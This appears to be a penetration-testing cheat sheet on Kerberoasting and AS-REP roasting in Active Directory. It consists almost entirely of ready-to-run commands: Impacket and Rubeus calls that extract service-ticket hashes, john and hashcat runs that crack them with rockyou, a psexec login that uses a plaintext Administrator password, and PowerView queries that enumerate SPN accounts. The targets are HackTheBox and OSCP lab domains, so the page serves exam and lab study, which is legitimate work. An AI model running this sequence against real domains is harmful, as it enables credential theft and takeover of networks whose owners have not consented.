# Service Account - Kerberoast

#### Linux

{% code overflow="wrap" %}
```bash
# Get Kerberoastable hashes
GetUserSPNs.py active.htb/SVC_TGS -dc-ip $RHOST -request
GetUserSPNs.py oscp.lab/wgraff -dc-ip $RHOST -request 

# -request: the script will retrieve the crackable hash. 

GetNPUsers.py absolute.htb/d.klay -dc-ip 10.129.192.41 -no-pass -format hashcat
# -no-pass: empty password without asking the password

# Windows with nopreauth
Rubeus.exe kerberoast /nopreauth:jjones /domain:rebound.htb /dc:dc01.rebound.htb /spns:./users.txt /nowrap

# Kali with nopreauth 
# pipenv shell
# git clone https://github.com/ThePorgs/impacket
# cd impacket/
# pip3 install .
# cd .. 

impacket/examples/GetUserSPNs.py rebound.htb/ -no-preauth jjones -usersfile users.txt -target-domain rebound.htb -dc-ip $RHOST -outputfile kerberoast.txt

# Crack the hash 
john kerberoast.txt --wordlist=/usr/share/wordlists/rockyou.txt --fork=8

# Crack the krb
hashcat -a 0 -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt

# Access with psexec
psexec.py active.htb/Administrator:Ticketmaster1968@10.129.163.246
```
{% endcode %}

#### Windows

{% code overflow="wrap" %}
```bash
# Find Kerberoastable Users
PS> Get-DomainUser -SPN | Select SamAccountName,serviceprincipalname | Sort SamAccountName
PS> Get-NetUser -SPN
```
{% endcode %}

####
